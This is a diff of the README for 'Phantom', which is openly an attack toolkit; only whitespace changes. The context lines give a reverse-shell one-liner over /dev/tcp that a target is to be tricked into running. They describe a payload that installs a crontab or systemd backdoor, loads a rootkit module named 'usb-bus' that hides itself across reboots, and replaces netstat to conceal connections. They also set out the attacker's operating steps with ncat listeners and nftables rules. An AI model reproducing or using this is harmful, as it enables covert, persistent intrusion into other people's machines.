@@ -15,11 +15,11 @@ otherwise the same payload gets executed each time the target connects to your m
 ## Usage
 
 ```
-phantom-init	ip 1st-port 2nd-port
+phantom-init  [ip][1st-port][2nd-port]
 ```
-*	ip: the attacker's ip
-*	1st-port: the port that listens for connections to deliver the payload
-*	2nd-port: the port that listens for the backdoor shells after delivering the payload
+*  ip: the attacker's ip
+*  1st-port: the port that listens for connections to deliver the payload
+*  2nd-port: the port that listens for the backdoor shells after delivering the payload
 
 You have to somehow make the target execute this code, so that he connects to the 1st-port:  
 bash -c 'bash &>/dev/tcp/ip/1st-port 0>&1 &'  
@@ -27,20 +27,20 @@ ip and 1st-port are the ones specified above.
 
 ## Files
 
-*	phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the payload file.
+*  phantom-init: Opens an ncat listening process to a predefined ip and port and redirects input to the payload file.
 
-*	payload: This is the file that gets executed when the target connects to the listening ncat 1st-port. It does the following:
-	* If the user connecting is not root it overwrites the user's crontab entry with code which periodically attempts to create a
-	backdoor shell to the 2nd-port.
-	* If the user connecting is root it creates a systemd service which executes a script, continuously trying to
-	create a backdoor bash shell to your machine (2nd-port). It also creates a systemd service which executes a script,
-	hiding the pids of the backdoor shells and both of the systemd services (ps aux cannot find them this way). It then
-	creates and inserts a rootkit module named usb-bus which hides its files, the ones of the scripts that the systemd services use
-	and the systemd services themselves. It is also persistent through reboots because the second systemd service
-	(the one which hides pids) inserts it when it loads at boot time. Then, it replaces netstat with a version that hides the remote
-	connections to the specified ip and 2nd-port.
+*  payload: This is the file that gets executed when the target connects to the listening ncat 1st-port. It does the following:
+* If the user connecting is not root it overwrites the user's crontab entry with code which periodically attempts to create a
+  backdoor shell to the 2nd-port.
+* If the user connecting is root it creates a systemd service which executes a script, continuously trying to
+  create a backdoor bash shell to your machine (2nd-port). It also creates a systemd service which executes a script,
+  hiding the pids of the backdoor shells and both of the systemd services (ps aux cannot find them this way). It then
+  creates and inserts a rootkit module named usb-bus which hides its files, the ones of the scripts that the systemd services use
+  and the systemd services themselves. It is also persistent through reboots because the second systemd service
+  (the one which hides pids) inserts it when it loads at boot time. Then, it replaces netstat with a version that hides the remote
+  connections to the specified ip and 2nd-port.
 
-*	phantom-firewall: This file uses nftables. Use it only with sudo. It makes a backup of the nft ruleset in /etc/nftables.conf.bak and then
+*  phantom-firewall: This file uses nftables. Use it only with sudo. It makes a backup of the nft ruleset in /etc/nftables.conf.bak and then
 modifies the nft ruleset so that it doesn't allow more than one connection from a target ip. This is good because the target machine will
 continuously open new bash shells, increasing the footprint of Phantom's actions and putting increasing and uneeded load on the target system.
 It can also undo changes made to the nft ruleset by using the argument -r | -R .
@@ -48,19 +48,19 @@ It can also undo changes made to the nft ruleset by using the argument -r | -R .
 ## Order of execution
 
 * Before delivering the payload:
-	1. Execute phantom-init and wait for the target to connect to your machine.
+  1. Execute phantom-init and wait for the target to connect to your machine.
 
 * After delivering the payload:
-	1. Execute phantom-firewall as root, so it can modify the firewall rules.
-	2. Create a ncat process listening at the 2nd-port. (use the -k flag to accept multiple connections)
+  1. Execute phantom-firewall as root, so it can modify the firewall rules.
+  2. Create a ncat process listening at the 2nd-port. (use the -k flag to accept multiple connections)
 
 ## Order of closing
 
-1.	Close phantom-firewall and wait for some seconds so the connections can start flowing normally again.
-2. 	Close the ncat listening process so all the connections get closed with it.
-3. 	Execute this command: sudo phantom-firewall -r | -R. This undoes any changes to the nft ruleset made by phantom-firewall.
-		This is needed if you want the target to be able to connect to you again, otherwise a nftables rule is gonna
-		block him.
+1.  Close phantom-firewall and wait for some seconds so the connections can start flowing normally again.
+2.   Close the ncat listening process so all the connections get closed with it.
+3.   Execute this command: sudo phantom-firewall -r | -R. This undoes any changes to the nft ruleset made by phantom-firewall.
+    This is needed if you want the target to be able to connect to you again, otherwise a nftables rule is gonna
+    block him.
 
 ### Contact Information
 
